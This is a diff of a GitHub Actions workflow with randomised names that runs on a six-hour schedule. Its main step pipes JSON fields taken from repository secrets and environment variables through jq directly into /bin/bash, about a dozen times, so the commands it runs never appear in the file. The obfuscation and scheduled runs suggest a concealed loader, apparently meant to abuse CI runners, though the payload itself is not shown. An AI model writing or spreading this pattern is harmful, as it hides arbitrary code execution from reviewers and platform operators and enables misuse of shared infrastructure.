@@ -2,7 +2,7 @@ name: yinzhiping2389
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
+    - cron: '51 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,24 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: yinzhiping2389
         env:
-          kua6304: ${{ secrets.kua6304 }}
+          zz74: ${{ secrets.zz74 }}
         run: |
-          echo $kua6304 | jq -r .vc2932 | /bin/bash
-          echo $kz36 | jq -r .ztv071 | /bin/bash
-          echo $v1913 | jq -r .ygzc068 | /bin/bash
-          echo $uf48 | jq -r .elef7654 | /bin/bash
-          echo $tpy4 | jq -r .kl0361 | /bin/bash
-          echo $saixk989 | jq -r .o4 | /bin/bash
-          echo $gu25957 | jq -r .iel63933 | /bin/bash
-          echo $vbd9424 | jq -r .dmi4159 | /bin/bash
-          echo $bla15 | jq -r .pe98 | /bin/bash
-          echo $qv1554 | jq -r .rhlv72815 | /bin/bash
-          echo $aohxa78 | jq -r .qtwha9156 | /bin/bash
-          echo $awl32 | jq -r .vkx7 | /bin/bash
-          echo $r520 | jq -r .ku9872 | /bin/bash
-          echo $yhhdg72 | jq -r .z79 | /bin/bash
-          echo $nada3206 | jq -r .bso68 | /bin/bash
-          echo $cit3347 | jq -r .ebwx21453 | /bin/bash
-          echo $s90037 | jq -r .h138 | /bin/bash
-          echo $bwbrh7 | jq -r .gbiwi2333 | /bin/bash
+          echo $zz74 | jq -r .l729 | /bin/bash
+          echo $r08991 | jq -r .tvs031 | /bin/bash
+          echo $keekv82083 | jq -r .puboi0975 | /bin/bash
+          echo $ine03264 | jq -r .ry6477 | /bin/bash
+          echo $h32 | jq -r .nnn20 | /bin/bash
+          echo $c07 | jq -r .jyd54 | /bin/bash
+          echo $hp575 | jq -r .ieqax2 | /bin/bash
+          echo $smfgp64 | jq -r .dlk87 | /bin/bash
+          echo $jexz785 | jq -r .t0728 | /bin/bash
+          echo $xqau95 | jq -r .bi3687 | /bin/bash
+          echo $b72 | jq -r .mx83472 | /bin/bash
 
